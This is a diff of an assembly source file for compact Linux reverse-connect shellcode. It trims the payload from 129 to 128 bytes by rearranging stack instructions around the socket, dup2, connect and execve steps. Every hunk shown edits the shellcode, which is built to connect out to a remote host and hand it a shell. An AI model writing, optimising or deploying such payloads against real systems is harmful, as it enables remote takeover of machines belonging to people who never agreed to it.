@@ -27,7 +27,7 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; 129 byte reverse connect shell
+; 128 byte reverse connect shell
 ;
 ; Tested on 32 and 64-bit versions of Linux
 ;
@@ -50,7 +50,6 @@
     xchg    eax, ebx
     stosd
     push    esp         ; &sa
-    pop     ebp
     
     ; step 1, create a socket
     ; x64: socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -77,12 +76,11 @@
 x64_dup2:
     mov     al, 33      ; rax = sys_dup2
     syscall
-    sub     esi, 1      ; watch out for that bug copycats ;-)
+    sub     esi, 1      ; watch out for that bug ;-)
     jns     x64_dup2    ; jump if not signed
     
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));
-    push    ebp
     pop     esi         ; rsi = &sa
     mov     dl, 16      ; rdx = sizeof(sa)
     mov     al, 42      ; rax = sys_connect
@@ -90,6 +88,7 @@ x64_dup2:
     jmp     x84_execve
 
 x86_socket:
+    pop     ebp         ; ebp = &sa
     push    esi         ; save 1
     pop     ebx         ; ebx = SYS_SOCKET
     push    edx         ; IPPROTO_IP
